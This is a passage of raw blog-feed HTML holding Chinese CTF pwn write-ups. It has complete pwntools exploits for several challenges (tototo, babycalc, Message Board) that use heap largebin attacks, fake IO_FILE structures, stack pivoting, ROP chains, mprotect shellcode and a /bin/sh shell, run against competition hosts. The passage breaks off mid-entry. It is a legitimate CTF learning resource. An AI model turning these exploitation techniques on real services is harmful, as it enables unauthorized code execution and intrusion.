class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>    <span class="hljs-keyword">if</span> libc_base &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span><br>    <br>    sleep(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    edit(-<span class="hljs-number">62</span>, p64(free_hook))<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, p64(sys_addr))<br>    delete(<span class="hljs-number">0</span>)<br>    p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;)</span><br><span class="hljs-comment">#pwn()</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">21795</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h1 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./tototo&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./tototo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">36789</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content?&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cadd</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br>cadd(<span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>)<br>cadd(<span class="hljs-number">1</span>, <span class="hljs-number">0x420</span>)<br>cadd(<span class="hljs-number">2</span>, <span class="hljs-number">0x200</span>)<br>cadd(<span class="hljs-number">3</span>, <span class="hljs-number">0x410</span>)<br>cadd(<span class="hljs-number">4</span>, <span class="hljs-number">0x200</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2a0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x26b72</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x27529</span><br>pop_rdx_r12_ret = libc_base + <span class="hljs-number">0x11c371</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>cadd(<span class="hljs-number">5</span>, <span class="hljs-number">0x430</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0</span>) + p64(IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">1</span>, payload)<br>cadd(<span class="hljs-number">6</span>, <span class="hljs-number">0x430</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0xae0</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x58</span><br>fake_IO_FILE += p64(heap_addr)             <span class="hljs-comment">#_lock</span><br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x68</span><br>fake_IO_FILE += p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x38</span><br><br>payload = fake_IO_FILE<br>payload += flat(<br>    p64(pop_rdi_ret), p64(heap_addr),<br>    p64(pop_rsi_ret), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_r12_ret), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br><br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>))<br>edit(<span class="hljs-number">3</span>, payload)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>西湖论剑-pwn</title>
    <link href="/2023/02/07/xhlj-pwn/"/>
    <url>/2023/02/07/xhlj-pwn/</url>
    
    <content type="html"><![CDATA[<p>第一次打西湖论剑，只做出了两道pwn题，那个jit到最后也没能看明白😞。</p><h3 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h3><p>如下图，输入0x100大小的数据可以修改栈上<code>i</code>的值，通过<code>i</code>与v3的偏移就可以修改栈上的任意一字节，而且输入后存在off-by-one</p><p><img src="/img/11/Screenshot_20230208_111806.png"></p><p>​</p><p>这里利用<code>i</code>与v3的偏移修改返回值为 <code>leave ret</code>的地址，只能更改一字节，这里修改为0x400C18，利用off-by-one改变rbp的值来实现栈迁移，具体效果如下：</p><img src="/img/11/Screenshot_20230209_124709.jpg" style="zoom:80%;" /><p>​</p><p>由于栈每次启动的地址不同，还需要爆破栈地址，再ret2libc。</p><p>​</p><p>最后就是关于中间那个方程组的求解，我当时是直接头铁硬算的(其实还比较好算)，赛后听说angr也能将结果跑出来，自己也尝试做了一下angr的解法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Go</span>():<br>    proj = angr.Project(<span class="hljs-string">&#x27;./babycalc&#x27;</span>)<br>    <br>    start_addr = <span class="hljs-number">0x40080a</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    init_state.regs.rbp = init_state.regs.rsp<br>    init_state.regs.rsp -= <span class="hljs-number">0x100</span><br><br>    v3 = claripy.BVS(<span class="hljs-string">&#x27;v3&#x27;</span>, <span class="hljs-number">8</span>)<br>    v4 = claripy.BVS(<span class="hljs-string">&#x27;v4&#x27;</span>, <span class="hljs-number">8</span>)<br>    v5 = claripy.BVS(<span class="hljs-string">&#x27;v5&#x27;</span>, <span class="hljs-number">8</span>)<br>    v5 = claripy.BVS(<span class="hljs-string">&#x27;v5&#x27;</span>, <span class="hljs-number">8</span>)<br>    v6 = claripy.BVS(<span class="hljs-string">&#x27;v6&#x27;</span>, <span class="hljs-number">8</span>)<br>    v7 = claripy.BVS(<span class="hljs-string">&#x27;v7&#x27;</span>, <span class="hljs-number">8</span>)<br>    v8 = claripy.BVS(<span class="hljs-string">&#x27;v8&#x27;</span>, <span class="hljs-number">8</span>)<br>    v9 = claripy.BVS(<span class="hljs-string">&#x27;v9&#x27;</span>, <span class="hljs-number">8</span>)<br>    v10 = claripy.BVS(<span class="hljs-string">&#x27;v10&#x27;</span>, <span class="hljs-number">8</span>)<br>    v11 = claripy.BVS(<span class="hljs-string">&#x27;v11&#x27;</span>, <span class="hljs-number">8</span>)<br>    v12 = claripy.BVS(<span class="hljs-string">&#x27;v12&#x27;</span>, <span class="hljs-number">8</span>)<br>    v13 = claripy.BVS(<span class="hljs-string">&#x27;v13&#x27;</span>, <span class="hljs-number">8</span>)<br>    v14 = claripy.BVS(<span class="hljs-string">&#x27;v14&#x27;</span>, <span class="hljs-number">8</span>)<br>    v15 = claripy.BVS(<span class="hljs-string">&#x27;v15&#x27;</span>, <span class="hljs-number">8</span>)<br>    v16 = claripy.BVS(<span class="hljs-string">&#x27;v16&#x27;</span>, <span class="hljs-number">8</span>)<br>    v17 = claripy.BVS(<span class="hljs-string">&#x27;v17&#x27;</span>, <span class="hljs-number">8</span>)<br>    v18 = claripy.BVS(<span class="hljs-string">&#x27;v18&#x27;</span>, <span class="hljs-number">8</span>)<br>    val = [v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        stack_addr = init_state.regs.rbp - <span class="hljs-number">0x30</span> + i<br>        init_state.memory.store(stack_addr, val[i])<br><br>    simgr = proj.factory.simgr(init_state)<br>    find_addr = <span class="hljs-number">0x400ba1</span><br>    simgr.explore(find = find_addr)<br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            real_val = solution_state.solver.<span class="hljs-built_in">eval</span>(val[i])<br>            <span class="hljs-built_in">print</span>(real_val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find!&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Go()<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/img/11/Screenshot_20230216_102443.png"></p><p>😋好神奇！angr真滴强！</p><p>​</p><p>完整exp</p><p>远程libc为2.23-0ubuntu11.3_amd64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babycalc&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    pop_rdi = <span class="hljs-number">0x400ca3</span><br>    ret = pop_rdi + <span class="hljs-number">1</span><br>    rop1 = p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(ret) * <span class="hljs-number">0x10</span> +  p64(<span class="hljs-number">0x400650</span>) <span class="hljs-comment">#</span><br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop1<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>    sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>    rop2 = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop2<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">26087</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h3 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h3><p>格式化字符串泄漏<code>__libc_start_main</code>函数地址，利用栈迁移到bss段继续执行ROP，使用mprotect函数更改bss的执行权限，最后执行shellcode。</p><p>​</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">22429</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span> <br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>libc = elf.libc<br><br>bss = <span class="hljs-number">0x4040b0</span><br>pop_rdi = <span class="hljs-number">0x401413</span><br>leave_ret = <span class="hljs-number">0x4012e1</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Welcome to DASCTF message board, please leave your name:&#x27;</span>,<span class="hljs-string">b&#x27;%31$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb0</span> + p64(bss + <span class="hljs-number">0xb0</span>) + p64(<span class="hljs-number">0x40136C</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br><br>payload = flat(<br>    p64(pop_rdi), p64(bss - <span class="hljs-number">0xb0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">7</span>),<br>    p64(mprotect),<br>    p64(bss + <span class="hljs-number">0x40</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload = payload.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(bss -<span class="hljs-number">8</span>) + p64(leave_ret)<br>p.sendafter(<span class="hljs-string">&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hgame-week4-pwn</title>
    <link href="/2023/02/07/hgame-week4-pwn/"/>
    <url>/2023/02/07/hgame-week4-pwn/</url>
    
    <content type="html"><![CDATA[<h3 id="without-hook"><a href="#without-hook" class="headerlink" title="without_hook"></a>without_hook</h3><p>libc给的是2.36-0ubuntu2_amd64，以前修改<code>__free_hook</code>和<code>__malloc_hook</code>的方法就行不通了，很容易想到使用largebin attack攻击去劫持IO控制流，最后构造house of cat或者house of apple的<code>fake_IO_FILE</code>，和以前我做过<a href="https://xtxtn.github.io/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/#store">强网拟态的一道题</a>很像。</p><p>唯一有区别的就是以前常用的<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>这个gadget似乎在该版本的libc中找不到了</p><p><img src="/img/11/Screenshot_20230208_095848.jpg"></p><p>这里我改用<code>mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</code>这个gadget，使用house of apple去实现setcontext函数对rsp的劫持。</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 